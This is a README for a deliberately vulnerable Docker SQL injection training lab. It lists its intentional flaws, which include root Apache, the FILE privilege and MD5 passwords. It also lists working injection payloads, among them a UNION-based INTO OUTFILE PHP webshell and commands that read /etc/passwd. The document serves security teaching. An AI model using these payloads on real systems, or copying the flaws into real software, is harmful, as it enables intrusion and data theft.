# SQL Injection Demo - University of Nicosia

Educational SQL injection vulnerability demonstration using Docker.

## 📁 Project Structure

```
sqli-demo/
├── docker-compose.yml
├── Dockerfile
├── init.sql
├── grant-file.sql        # FILE privilege grant script
├── src/
│   ├── index.php
│   └── logo.png          # University of Nicosia logo
└── README.md
```

## 🚀 Quick Start

### Prerequisites
- Docker installed
- Docker Compose installed

### Setup Instructions

1. **Create the project directory:**
```bash
mkdir sqli-demo
cd sqli-demo
```

2. **Create the necessary files:**
   - Copy `docker-compose.yml` to the root directory
   - Copy `Dockerfile` to the root directory
   - Copy `init.sql` to the root directory
   - Create `src/` directory and copy `index.php` into it
   - **Add the University of Nicosia logo:**
     - Save your downloaded logo as `logo.png` in the `src/` directory

3. **Start the application:**
```bash
docker-compose up -d
```

4. **Wait for MySQL to initialize** (takes about 20-30 seconds on first run)

5. **Access the application:**
   - Open your browser to: `http://localhost:8080`

## 🛑 Stop the Application

```bash
docker-compose down
```

## 🧹 Clean Up & Reset (Remove Uploaded Webshells)

To completely reset the environment and remove all uploaded webshells:

```bash
docker-compose down -v
docker-compose up -d
```

The `-v` flag removes all volumes, giving you a fresh start. This is recommended between demonstration sessions.

**Note:** Your source files (index.php, check.php, logo.png) are safe in the `src/` directory and won't be affected.

## 🗄️ Database Information

- **Host:** db (internal) / localhost:3306 (external)
- **Database:** dvwa
- **Username:** dvwa
- **Password:** p@ssw0rd
- **Root Password:** rootpass

### Tables Created:
- `users` - Contains user information (same structure as DVWA)
- `secrets` - Contains sensitive data for advanced exploitation

## 🎯 Learning Objectives

Students will learn to:
1. Identify SQL injection vulnerabilities
2. Exploit basic SQL injection (OR-based, UNION-based)
3. Extract database information (VERSION, DATABASE, USER)
4. Perform time-based blind SQL injection (SLEEP)
5. Enumerate database structure using information_schema
6. Extract data from multiple tables
7. Upload webshells via SQL injection (INTO OUTFILE)
8. **Understand the critical impact of running services as root**
9. Understand the impact of unsanitized input

## ⚠️ Security Misconfigurations (Intentional)

This demo includes **multiple intentional security flaws** for educational purposes:

1. **SQL Injection** - No input sanitization or prepared statements
2. **Running Apache as ROOT** - Web server has full system privileges
3. **MySQL FILE privilege granted** - Allows writing to filesystem
4. **No secure_file_priv restriction** - Can write anywhere
5. **Storing passwords as MD5** - Weak hashing without salt

**Impact:** SQL Injection + Root + FILE = Complete system compromise

## 💡 Example Payloads

### Basic Exploitation
```sql
1' OR '1'='1
1' OR 1=1-- -
1' OR 1=1#
```

### Information Gathering
```sql
1' UNION SELECT NULL, VERSION(), NULL, NULL-- -
1' UNION SELECT NULL, DATABASE(), NULL, NULL-- -
1' UNION SELECT NULL, USER(), NULL, NULL-- -
```

### Table Enumeration
```sql
1' UNION SELECT NULL, table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=DATABASE()-- -
```

### Time-Based Blind
```sql
1' AND SLEEP(5)-- -
```

### Data Exfiltration
```sql
1' UNION SELECT NULL, GROUP_CONCAT(user), NULL, NULL FROM users-- -
1' UNION SELECT NULL, secret_data, NULL, NULL FROM secrets-- -
1' UNION SELECT user_id, user, password, NULL FROM users-- -
```

### Webshell Upload (Advanced)
```sql
# Upload simple webshell
1' UNION SELECT NULL, '<?php system($_GET["cmd"]); ?>', NULL, NULL INTO OUTFILE '/var/www/html/shell.php'-- -

# Test the webshell
http://localhost:8080/shell.php?cmd=whoami
http://localhost:8080/shell.php?cmd=ls -la
http://localhost:8080/shell.php?cmd=cat /etc/passwd
```

## 🔧 Troubleshooting

### Container won't start
```bash
docker-compose logs
```

### Reset the database
```bash
docker-compose down -v
docker-compose up -d
```

### Access MySQL directly
```bash
docker-compose exec db mysql -u dvwa -pp@ssw0rd dvwa
```

## ⚠️ Security Warning

**This application is intentionally vulnerable for educational purposes only.**

- Never deploy this in production
- Only use in isolated learning environments
- Do not expose to the internet
- Use only for authorized security training

## 📚 Additional Resources

- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- PortSwigger SQL Injection: https://portswigger.net/web-security/sql-injection
- DVWA Project: https://github.com/digininja/DVWA

## 🎓 University of Nicosia
Cybersecurity Training Exercise